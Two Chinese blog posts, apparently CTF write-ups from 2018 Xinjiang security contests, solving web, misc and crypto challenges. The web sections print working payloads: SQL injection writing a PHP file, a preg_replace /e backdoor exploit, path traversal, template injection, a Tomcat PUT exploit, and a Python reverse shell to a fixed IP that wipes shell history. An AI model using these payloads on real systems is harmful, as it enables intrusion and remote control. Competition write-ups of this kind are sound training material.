[{"title":"新疆首届攻防比赛wp","url":"https://www.xjseck.com/2018/09/18/新疆首届攻防比赛wp/","content":"<h2 id=\"心得\"><a href=\"#心得\" class=\"headerlink\" title=\"[心得]\"></a>[心得]</h2><p>下线攻防类比赛，算是第一次参加赛宁举办的线下攻防了，赛前以为会有简单的内置后门可以使用，都已经写好了通过一句话木马写内存马的批量脚本了，但是比赛时没有发现简单的内置一句话木马，导致比赛进程不是很顺利，名次也不佳，其次也是自己太菜。这里就再次简单的总结一下线下攻防比赛的思路和这次比赛的分析。</p>\n<h2 id=\"线下比赛套路汇总\"><a href=\"#线下比赛套路汇总\" class=\"headerlink\" title=\"线下比赛套路汇总\"></a>线下比赛套路汇总</h2><p>就把给别人培训时写好的PPT贴一下吧<br><img src=\"1.jpeg\" alt=\"ppt\"><br><img src=\"2.jpeg\" alt=\"ppt\"><br><img src=\"3.jpeg\" alt=\"ppt\"><br><img src=\"4.jpeg\" alt=\"ppt\"><br>线下攻防的比赛思路大致应该就这么多吧，比较硬的技能点应该是快速定位漏洞和批量脚本的编写上了吧，只要把套路融会贯通，应该能狗住。</p>\n<h2 id=\"比赛的插曲\"><a href=\"#比赛的插曲\" class=\"headerlink\" title=\"比赛的插曲\"></a>比赛的插曲</h2><p>这里贴一下赛宁比赛的比赛说明关键点如下</p>\n<hr>\n<p><strong>比赛环境</strong></p>\n<ul>\n<li>选手登录后下载环境信息zip包，zip解压密码即为登录密码，zip包中包含包含以下信息：环境ip、登录私钥、选手token；</li>\n<li>题目虚拟机使用私钥ssh登录，用户名为xctf，私钥在下载的环境信息zip包中；</li>\n<li>主办方提供各赛题端口的流量数据，在本队维护的题目虚拟机/home/xctf/packages/下，流量数据每10分钟提供一次，如果磁盘空间不足注意清理。</li>\n<li>每个参参赛选手员网线连接自己PC，dhcp获取地址即可<br>两个web，两个pwn<br><strong>提交Flag</strong><br>登录页面下载的环境信息包含token信息，选手凭借此 token 身份提交 flag。<br>提交样例：<br><code>curl http://172.16.200.14:9000/submit_flag/ -d &quot;flag=XXXXX&amp;token=XXXXX&quot;</code></li>\n</ul>\n<hr>\n<p>比赛过程中通过私钥进行登录，导致很多选手不会使用私钥登录，很尴尬，具体的使用如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo ssh -i id_rsa xctf@172.16.5.103</span><br><span class=\"line\">sudo scp -i id_rsa xctf@172.16.3.102:/tmp/web102-cap.tar /home/xjseck/桌面/ </span><br><span class=\"line\">windwos建议使用MobaXterm shell终端，导入私钥文件，进行登录，和文件下载</span><br></pre></td></tr></table></figure>\n<p>后面的操作按照上面的比赛套路进行操作就OK了。</p>\n<h2 id=\"web的漏洞汇总\"><a href=\"#web的漏洞汇总\" class=\"headerlink\" title=\"web的漏洞汇总\"></a>web的漏洞汇总</h2><p><strong>WEB2汇总</strong><br>首先我们还要了解web网站的文件配置权限<br><img src=\"5.jpeg\" alt=\"\"><br>我们可以看出用户的操作权限明显比www-data用户权限高，也就是防御者的权限高于攻击者的权限，可以防止getshell之后被删站，也可以进行源码的修改。<br>之后就可以进行常规的操作了<br>D盾扫描没有常见的后门文件，那现在思路就有两个了，一、先不进行防御，下载流量文件/home/xctf/packages/进行分析，找到漏洞点，利用别人的shell。二、进行防御，可以通过文件的所属者，进行shell的查杀，之后进行代码审计，寻找漏洞。<br><strong>漏洞一</strong></p>\n<p>添加cookie，绕过后台登录验证。<br><img src=\"6.jpeg\" alt=\"cookie\"><br>然后水印图片处上传php3后门文件getshell<br><img src=\"7.jpeg\" alt=\"cookie\"></p>\n<p><strong>漏洞二</strong><br>后台登录处sql注入<br><strong>/admin/files/login.php</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">ob_start();</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'../inc/conn.php'</span>;</span><br><span class=\"line\">$login=$_POST[<span class=\"string\">'login'</span>];</span><br><span class=\"line\">$user=$_POST[<span class=\"string\">'user'</span>];</span><br><span class=\"line\">$password=$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">$checkbox=$_POST[<span class=\"string\">'checkbox'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($login&lt;&gt;<span class=\"string\">\"\"</span>)&#123;</span><br><span class=\"line\">$query = <span class=\"string\">\"SELECT * FROM manage WHERE user='$user'\"</span>;</span><br><span class=\"line\">$result = mysql_query($query) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">'SQL语句有误：'</span>.mysql_error());</span><br><span class=\"line\">$users = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure></p>\n<p>未对用户输入的用户名和密码进行过滤导致sql注入<br><code>pyload：user=1&#39; union select 1,2,3,4,5,6,7,&#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/upload/1.php&#39;#&amp;password=qweq&amp;login=yes</code><br><img src=\"8.jpeg\" alt=\"sqlinject\"></p>\n<p><strong>漏洞三</strong><br>/files/list.php<br>129行左右<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getpages</span><span class=\"params\">($str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'123'</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span>(strpos(<span class=\"string\">'list'</span>,<span class=\"keyword\">__FILE__</span>)===<span class=\"keyword\">false</span>)&#123;preg_replace(<span class=\"string\">\"/123(.*)123/ies\"</span>, <span class=\"string\">'getpages(\"\\1\")'</span>, $_GET[<span class=\"string\">\"pages\"</span>]); &#125; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>典型的preg_replace /e后门<br>比赛当时就4个小时的时间，光去利用了第一个漏洞，后面的漏洞，在日志流量中也没有看到，就没有细看，问题很大。<br>payload：<code>files/list.php?pages=123{${eval($_GET[a])}}123&amp;a=system(&#39;cat /flag&#39;);</code><br><img src=\"9.jpeg\" alt=\"prge_replace\"></p>\n<p><strong>WEB1汇总</strong><br>Nodejs的一个博客，这个比赛的时候大家应该都没有找到什么漏洞吧，赛后问了一下主办方的师傅，一般的思路点就是：搜索uoload 或者download等关键字，进行查找分析代码，具体漏洞点有<br>main.js 在处理uploads 的逻辑时，可以从url中传入..%2f 造成目录穿越读取任意文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.get(&quot;/uploads/(*)&quot;,</span><br><span class=\"line\">function(req, res) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  if (req.path.indexOf(&quot;images&quot;) &lt; 0) &#123;</span><br><span class=\"line\">    res.set(prefix);</span><br><span class=\"line\">    res.send(&quot;Error！&quot;);</span><br><span class=\"line\">    res.end();</span><br><span class=\"line\">  &#125; else if (req.path.indexOf(&apos;\\\\.md&apos;) &gt; 0) &#123;</span><br><span class=\"line\">    res.set(prefix);</span><br><span class=\"line\">    res.send(&quot;Error！&quot;);</span><br><span class=\"line\">    res.end();</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    res.set(&#123;</span><br><span class=\"line\">      &quot;Content-Type&quot;: &quot;images/jpeg&quot;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    text = fs.readFileSync(__dirname + decodeURIComponent(req.path));</span><br><span class=\"line\">    res.send(text);</span><br><span class=\"line\">    res.end();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>payload：<code>/uploads/images/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/flag</code></p>\n","categories":["比赛"],"tags":["CTF","攻防"]},{"title":"首届新疆网络安全知识技能竞赛(团体赛)","url":"https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。<br><img src=\"score.png\" alt=\"\"></p>\n<h2 id=\"团体解题晋级赛\"><a href=\"#团体解题晋级赛\" class=\"headerlink\" title=\"团体解题晋级赛\"></a>团体解题晋级赛</h2><p>有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。</p>\n<h3 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h3><ul>\n<li><strong>revenge_of_sql</strong><br>sql的复仇，应该是和sql注入有关，首先进行敏感目录扫描，发现.git源码泄露<br>直接githack  发现 index.php文件存在  过滤空格的盲注注入，直接sqlmap 跑数据库但是发现没有<br><img src=\"sql1.png\" alt=\"sql\"><br>sqlmap -r 1.txt –random-agent –dbms=mysql –tamper=space2comment.py -v 3 –sql-shell <figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">available databases [4]:</span><br><span class=\"line\">[*] information_schema</span><br><span class=\"line\">[*] mysql</span><br><span class=\"line\">[*] performance_schema</span><br><span class=\"line\">[*] sql1</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>admin xman  登录进入 和源码的逻辑相同没有显示<br><img src=\"sql2.png\" alt=\"sql\"><br>也可以手工注入登录<br><code>Username=&#39;/**/union/**/select(&#39;202cb962ac59075b964b07152d234b70&#39;)#&amp;password=123</code><br>最后分析一下git历史信息</p>\n<p><img src=\"sql3.png\" alt=\"sql\"><br>发现有flag22222.php<br>使用sqlmap 跑一下<br><img src=\"sql5.png\" alt=\"sql\"></p>\n<ul>\n<li><strong>Web baby python</strong><br>没有啥思路，直接爆破url参数<br><img src=\"p.png\" alt=\"python\"><br>发现出现花括号 会出现信息的不完整输出，那应该明确了考点，就是python web的模板注入，可以直接使用函数读文件<br>也可以使用其他python 沙盒绕过<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/flag&apos;).read() &#125;&#125;等python链进行代码的执行</span><br><span class=\"line\">http://10.98.98.25:5554/404?msg=&apos;&#125;&#125;&#123;&#123; open(&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"p1.png\" alt=\"python\"><br><img src=\"p2.png\" alt=\"python\"></p>\n<ul>\n<li><strong>ezupload</strong><br>文件上传常规套路：直接大小写、javascript、 改后缀 、截断或这让js失效</li>\n</ul>\n<p><img src=\"upload.png\" alt=\"upload\"><br><img src=\"upload1.png\" alt=\"upload\"></p>\n<ul>\n<li><p><strong>http</strong></p>\n<h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"[步骤]\"></a><strong>[步骤]</strong></h2><p>访问发现提示 <code>不是本地人，不允许访问</code>， 于是修改xff为127.0.0.1或localhost伪造为本地<br>伪造后提示未登录，查看cookie发现存在login=0的键值，将0修改为1得到flag</p>\n</li>\n<li><p><strong>ezpentest</strong></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"[分析]\"></a><strong>[分析]</strong></h2><p>这道题，没有队伍解出来，当时进行了目录的扫描，和nmap的扫描，发现了8080 端口tomcat，按题目的说明，应该是一个tomcat溢出漏洞，赛后讨论应该是<br>CVE-2017-12617(远程代码执行漏洞)影响范围:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Apache Tomcat 9.0.0.M1-9.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">Apache Tomcat 8.5.0-8.5.22</span><br><span class=\"line\"></span><br><span class=\"line\">Apache Tomcat 8.0.0.RC1-8.0.46</span><br><span class=\"line\"></span><br><span class=\"line\">Apache Tomcat 7.0.0-7.0.81</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>当时没有网，也就没有找到具体的payload ，可以参考P牛的vuln库 任意文件写入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT /1.jsp/ HTTP/1.1</span><br><span class=\"line\">Host: your-ip:8080</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Accept-Language: en</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 5</span><br><span class=\"line\"></span><br><span class=\"line\">shell</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>Check in</strong><br>考察的是python的cPickle的反序列化漏洞</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># !/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> marshal</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> cPickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">foo</span><span class=\"params\">()</span>:</span><span class=\"comment\">#you should write your code in this function</span></span><br><span class=\"line\">    <span class=\"keyword\">import</span> socket</span><br><span class=\"line\">    <span class=\"keyword\">import</span> os,pty</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">test</span><span class=\"params\">(ip,port)</span>:</span></span><br><span class=\"line\">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">        s.connect((ip,int(port)))</span><br><span class=\"line\">        os.dup2(s.fileno(),<span class=\"number\">0</span>)</span><br><span class=\"line\">        os.dup2(s.fileno(),<span class=\"number\">1</span>)</span><br><span class=\"line\">        os.dup2(s.fileno(),<span class=\"number\">2</span>)</span><br><span class=\"line\">        shell= <span class=\"string\">\"/bin/sh\"</span></span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTFILE\"</span>)</span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTFILESIZE\"</span>)</span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTSIZE\"</span>)</span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTORY\"</span>)</span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTSAVE\"</span>)</span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTZONE\"</span>)</span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTLOG\"</span>)</span><br><span class=\"line\">        os.unsetenv(<span class=\"string\">\"HISTCMD\"</span>)</span><br><span class=\"line\">        os.putenv(<span class=\"string\">\"HISTFILE\"</span>,<span class=\"string\">'/dev/null'</span>)</span><br><span class=\"line\">        os.putenv(<span class=\"string\">\"HISTSIZE\"</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">        os.putenv(<span class=\"string\">\"HISTFILESIZE\"</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">        pty.spawn(shell)</span><br><span class=\"line\">        s.close()</span><br><span class=\"line\">    test(<span class=\"string\">'202.112.51.130'</span>,<span class=\"number\">9999</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:<span class=\"comment\">#尝试使用cPickle来序列号代码对象</span></span><br><span class=\"line\">    cPickle.dumps(foo.func_code)</span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> e <span class=\"comment\">#TypeError: can't pickle code objects</span></span><br><span class=\"line\"></span><br><span class=\"line\">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class=\"line\"><span class=\"keyword\">print</span> code_serialized</span><br></pre></td></tr></table></figure>\n<h3 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a><h2>misc</h2></h3><ul>\n<li><strong>流量包解密02</strong><br><img src=\"cap.png\" alt=\"\"><br>题目进行了说明，mac地址就是秘钥，国赛的题目也出现过，当时提取mac之后没有跑出来<br>，最会拼一下脑洞发现，爆破的时候的数据包的mac 地址就是密码<br>提示是mac，尝试提取mac不行，结果就是脑洞<br> 1  B4:0B:44:C2:D5:FF  xj                        WPA (1 handshake)<br><img src=\"cap1.png\" alt=\"\"><br><img src=\"cap2.png\" alt=\"cap\"><br>然后发现就是dns  apr 做中间人，做了个test.txt  success.txt的测试<br>就没有url了需要再次脑洞一下吧。还是那个师傅的blog<br><img src=\"cap4.png\" alt=\"cap\"><br>说的是url flag{<a href=\"http://www.wiattack.net/test.txt}\" target=\"_blank\" rel=\"noopener\">http://www.wiattack.net/test.txt}</a></li>\n</ul>\n<ul>\n<li><strong>如来十三掌</strong><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>与佛论禅解密：<br><code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code><br>尝试base64解密失败，继续尝试，发现先rot13，在base64<br><code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code><br><code>flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</code></p>\n<ul>\n<li><p><strong>Find_your_flag</strong><br>是一个内存取证的题目<br>Volatility工具安排一下<br><img src=\"qu.png\" alt=\"\"><br>遍历文件找一找flag<br><img src=\"qu1.png\" alt=\"\"><br>导出文件发现需要密码，根据提示猜测密码可能在剪切板<br><img src=\"qu2.png\" alt=\"\"><br><img src=\"qu3.png\" alt=\"\"></p>\n</li>\n<li><p><strong>倍四家族</strong><br>这个题是一个7z的带密码的压缩包，想推导密码，你需要点脑洞，根据题目和压缩包，发现密码是flag字符的base64编码，解密出flag.txt<br><img src=\"base.png\" alt=\"\"><br>最后写一个脚本进行每一行的解密（参考官方wp）</p>\n</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_base64_diff_value</span><span class=\"params\">(s1, s2)</span>:</span></span><br><span class=\"line\">  base64chars = <span class=\"string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class=\"line\">  res = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(len(s1)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> s1[i] != s2[i]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">solve_stego</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">  <span class=\"keyword\">with</span> open(<span class=\"string\">'flag.txt'</span>, <span class=\"string\">'rb'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    file_lines = f.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">  bin_str = <span class=\"string\">''</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> file_lines:</span><br><span class=\"line\">    steg_line = line.replace(<span class=\"string\">'\\n'</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\">    norm_line = line.replace(<span class=\"string\">'\\n'</span>, <span class=\"string\">''</span>).decode(<span class=\"string\">'base64'</span>).encode(<span class=\"string\">'base64'</span>).replace(<span class=\"string\">'\\n'</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class=\"line\">    pads_num = steg_line.count(<span class=\"string\">'='</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> diff:</span><br><span class=\"line\">    bin_str += bin(diff)[<span class=\"number\">2</span>:].zfill(pads_num * <span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">    bin_str += <span class=\"string\">'0'</span> * pads_num * <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">  res_str = <span class=\"string\">''</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">0</span>, len(bin_str), <span class=\"number\">8</span>):</span><br><span class=\"line\">    res_str += chr(int(bin_str[i:i+<span class=\"number\">8</span>], <span class=\"number\">2</span>))</span><br><span class=\"line\">  <span class=\"keyword\">print</span> res_str</span><br><span class=\"line\"></span><br><span class=\"line\">solve_stego()</span><br></pre></td></tr></table></figure>\n<p>得到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">W^7?+dv|4DVs&amp;z9Wn^D$Z+2y0W?^k&lt;Y&lt;XW~X&gt;)U7bZK*DVPkY&lt;WPJ</span><br></pre></td></tr></table></figure>\n<ul>\n<li>猜测是base85，python跑一下</li>\n</ul>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [<span class=\"number\">1</span>]: <span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">In [<span class=\"number\">2</span>]: base64.b85decode(<span class=\"string\">b'W^7?+dv|4DVs&amp;z9Wn^D$Z+2y0W?^k&lt;Y&lt;XW~X&gt;)U7bZK*DVPkY&lt;WPJ'</span>)</span><br><span class=\"line\">Out[<span class=\"number\">2</span>]: <span class=\"string\">b'flag&#123;we_buried_love_family_dissatisfacted&#125;'</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"密码\"><a href=\"#密码\" class=\"headerlink\" title=\"密码\"></a><h2>密码</h2></h3><ul>\n<li><strong>short_story</strong><br>一个doc文档，字体有点高低和一个隐藏的矩阵，应该是hill加密<br><img src=\"story.png\" alt=\"\"></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">美国代表团访华时曾有一名官员当着周总理的面说中国人很喜欢低着头走路而我们美国人却总是抬着头走路周总理不慌不忙脸带微笑地说这并不奇怪因为我们中国人喜欢走上坡路而你们美国人喜欢走下坡路</span><br><span class=\"line\"></span><br><span class=\"line\">AABBBBAAABBABBAAAABBAABBBBAAABBBAAAAABBAAAABABAAAABABBAAAABBAAAABABBABABABAABABBAAAABABABA</span><br><span class=\"line\">hrwdhrygcqwdbnklbk</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>继续从文档中获得密钥。文档末尾隐藏了一个矩阵，选中更改字体颜色后可以看到。根据这个矩阵，联想到hill加密</li>\n</ol>\n<p>先根据密钥矩阵计算逆矩阵，将密文按照2个2个分组，与逆矩阵右乘得到明文。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:UTF-8</span></span><br><span class=\"line\">key = [<span class=\"number\">-7</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">-1</span>]</span><br><span class=\"line\">m = <span class=\"string\">\"hrwdhrygcqwdbnklbk\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">c= []</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(m)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(m[x]&gt;=<span class=\"string\">'a'</span><span class=\"keyword\">and</span> x&lt;=<span class=\"string\">'z'</span>):</span><br><span class=\"line\">        <span class=\"keyword\">print</span> 